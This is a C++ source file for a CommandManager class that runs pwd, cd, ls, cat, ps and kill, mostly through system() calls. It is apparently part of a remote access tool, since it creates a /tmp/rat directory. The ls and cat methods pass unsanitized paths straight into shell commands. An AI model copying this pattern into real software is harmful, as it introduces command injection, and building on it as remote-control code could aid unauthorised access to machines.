#include <CommandManager.hpp>

CommandManager* CommandManager::getInstance() {
  if (pcmInstance == nullptr) {
    pcmInstance = new CommandManager();
  }
  return pcmInstance;
}

bool CommandManager::pwd(std::string* psOutput, bool* pbIsTruncated) {
  char pcCwd[4096];
  getcwd(pcCwd, sizeof(pcCwd));
  *psOutput = pcCwd;
  *pbIsTruncated = false;
  return false;
}

bool CommandManager::cd(std::string sPath, std::string* psOutput,
                        bool* pbIsTruncated) {
  *psOutput = "";
  *pbIsTruncated = false;
  if (chdir(&sPath[0])) {
    *psOutput = std::format("Cannot change directory, error ERRNO {}", errno);
    return true;
  }
  return pwd(psOutput, pbIsTruncated);
}

bool CommandManager::ls(std::string sPath, std::string* psOutput,
                        bool* pbIsTruncated) {
  return runCommand(std::format("ls {}", sPath), psOutput, pbIsTruncated);
}

bool CommandManager::cat(std::string sPath, std::string* psOutput,
                         bool* pbIsTruncated) {
  return runCommand(std::format("cat {}", sPath), psOutput, pbIsTruncated);
}

bool CommandManager::ps(std::string* psOutput, bool* pbIsTruncated) {
  return runCommand("ps aux", psOutput, pbIsTruncated);
}

bool CommandManager::kill(std::string sPid, std::string* psOutput,
                          bool* pbIsTruncated) {
  unsigned int uiPid = std::stoul(sPid);
  return runCommand(std::format("kill {}", uiPid), psOutput, pbIsTruncated);
}

CommandManager* CommandManager::pcmInstance = nullptr;

CommandManager::CommandManager() {
  chdir("/");
  system("mkdir -p /tmp/rat");
}

CommandManager::~CommandManager() {}

bool CommandManager::runCommand(std::string sCommand, std::string* psOutput,
                                bool* pbIsTruncated) {
  std::ifstream fi;
  std::string sOutput;
  bool isFailed = false;

  system(std::format("touch {}", TEMP_OUTPUT_FILE).c_str());
  fi.open(TEMP_OUTPUT_FILE);
  if (!fi.is_open()) {
    *psOutput = std::format("Cannot read file {}\n", TEMP_OUTPUT_FILE);
    return true;
  }

  *pbIsTruncated = false;

  system(std::format("{} > {}", sCommand, TEMP_OUTPUT_FILE).c_str());
  getline(fi, sOutput);
  std::cout << sOutput << "\n";
  if (sOutput.find(std::format("{}: ", sCommand)) != std::string::npos) {
    isFailed = true;
  }

  *psOutput = sOutput;
  while (getline(fi, sOutput)) {
    *psOutput += "\n";
    *psOutput += sOutput;
    if (psOutput->size() > (int)1e6) {
      *pbIsTruncated = true;
      break;
    }
  }

  fi.close();
  return isFailed;
}